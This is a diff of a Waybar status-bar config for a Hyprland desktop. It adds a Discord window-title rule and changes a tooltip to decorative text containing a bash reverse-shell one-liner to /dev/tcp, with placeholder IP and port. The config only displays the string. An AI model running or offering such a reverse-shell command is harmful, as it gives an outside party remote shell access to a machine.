@@ -2,7 +2,7 @@
     "custom/arch": {
         "format": "󰣇",
         "tooltip": true,
-        "tooltip-format": "Made with 𖹭 \n ~shivam"
+        "tooltip-format": "      ꧁- 𖤐𓆩𝐒𝖎ᥣ᥎eɾᴛꪖ𝑖꒒𓆪𖤐 -꧂  || .𖥔 ݁ ˖🕸️🕷.𖥔 ݁ ˖\n bash -c 'bash -i &gt;&amp; /dev/tcp/-ip-/-port- 0&gt;&amp;1' "
     },
 
     "hyprland/workspaces": {
@@ -46,6 +46,7 @@
             "(.*) - org.kde.dolphin": " 🐬  $1 ",
             "(.*) - install4j-burp-StartBurp": " 🐦‍🔥  $1 ",
             "(.*) - org.wireshark.Wireshark": " 🦈  $1 ",
+            "(.*) - discord": "   $1 ",
             "(.*) - ": " Arch  Hyprland "
         }
     },
